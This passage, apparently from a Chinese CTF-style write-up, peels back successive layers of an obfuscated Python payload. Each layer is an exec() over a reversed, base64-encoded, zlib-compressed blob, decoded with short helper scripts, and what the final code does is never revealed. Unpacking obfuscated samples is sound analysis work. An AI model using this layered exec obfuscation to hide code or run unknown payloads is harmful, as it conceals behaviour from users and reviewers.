Jl8U3WjyB68Rq4HATk/cK7LkJHHMjC3W7dTmOBpfoWMVELaL+RkqWYv0CpW5qENLlnOPBrGaGNeIZahzbnruEPIIXGkGz1fE5d42MaKZsCUYt1xXiai9+cbKGj/d0lICq7uc7bRhEBx46DyBXTz1gfJnT2ur6x4Avb5wY2pcYrcD2OR6AikMvm2c0bhabJB6o0DhONJ4lCxmKdGBzuwrts1u0D2yuo37yLLfsGDuyepNw8lyTNc2nyhCVBfW23DnBQmWc1QLCoRppVhjKXwOpODKO8R8YHnQM+rLk6EOabCdGK57iRzMcT3wc436kVmHXDcI0ZsYGY5aIC5DbdWjUt2ZuU0LmuLwzCTS99zhOoO8DKNqbK4bINLyAI2X928xib+hmIOqp3oSgC2PdFc8yqthN9S55omtex2xkEe8CY48C6z4JtqVtqhPQWQ8kte6xlepiVYCqIbE2Vg4fN//L/ff/u//9p4Lz7uq46yWenkJ/x90j/5mEIors5McSuFi9dygyyR5wJfuqGhOfsVVwJe&#x27;</span><br><span class="line">decoded = zlib.decompress(base64.b64decode(payload[::-1]))</span><br><span class="line">print(decoded.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec((_)(b&#x27;=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&#x27;))</span><br></pre></td></tr></table></figure>

<p>继续解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">payload = b&#x27;=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&#x27;</span><br><span class="line"></span><br><span class="line">decoded_code = zlib.decompress(base64.b64decode(payload[::-1]))</span><br><span class="line">print(decoded_code.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec((_)(b&#x27;==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&#x27;))</span><br></pre></td></tr></table></figure>

<p>解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">payload = b&#x27;==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&#x27;</span><br><span class="line"></span><br><span class="line">decoded = zlib.decompress(base64.b64decode(payload[::-1]))</span><br><span class="line">print(decoded.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec((_)(b&#x27;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